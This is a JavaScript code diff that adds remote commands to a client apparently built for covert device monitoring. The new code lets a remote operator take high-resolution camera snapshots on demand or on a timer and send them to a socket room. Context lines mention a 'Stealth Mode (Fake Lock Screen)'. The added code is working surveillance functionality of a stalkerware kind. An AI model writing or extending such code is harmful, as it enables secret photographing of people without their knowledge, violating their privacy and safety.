@@ -362,6 +362,14 @@
             if (payload.command === 'stop-compatibility-mode') {
                 stopCanvasStreaming();
             }
+
+            // New Commands
+            if (payload.command === 'capture-photo') {
+                sendSingleSnapshot("التقاط صورة يدوية...");
+            }
+            if (payload.command === 'set-auto-snapshot') {
+                setupAutoSnapshot(payload.enabled, payload.minutes);
+            }
         });
 
         // Helper: Stealth Mode (Fake Lock Screen)
@@ -410,8 +418,33 @@
 
         // --- SNAPSHOT / COMPATIBILITY MODE ---
         let canvasInterval = null;
+        let autoSnapshotTimer = null; // Persistent timer for periodic shots
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
+
+        function sendSingleSnapshot(msg) {
+            if (localVideo.readyState >= 2) {
+                canvas.width = 1280; // High res for manual photos
+                canvas.height = 720;
+                ctx.drawImage(localVideo, 0, 0, canvas.width, canvas.height);
+                const data = canvas.toDataURL('image/jpeg', 0.8);
+                socket.emit('stream-data', { roomId, image: data, isSnapshot: true });
+                log(msg);
+            }
+        }
+
+        function setupAutoSnapshot(enabled, minutes) {
+            if (autoSnapshotTimer) clearInterval(autoSnapshotTimer);
+            if (enabled) {
+                const ms = minutes * 60 * 1000;
+                autoSnapshotTimer = setInterval(() => {
+                    sendSingleSnapshot("إرسال لقطة دورية تلقائية...");
+                }, ms);
+                log(`Auto-snapshot enabled: every ${minutes} mins`);
+            } else {
+                log("Auto-snapshot disabled.");
+            }
+        }
 
         function startCanvasStreaming(intervalMs) {
             if (canvasInterval) clearInterval(canvasInterval);
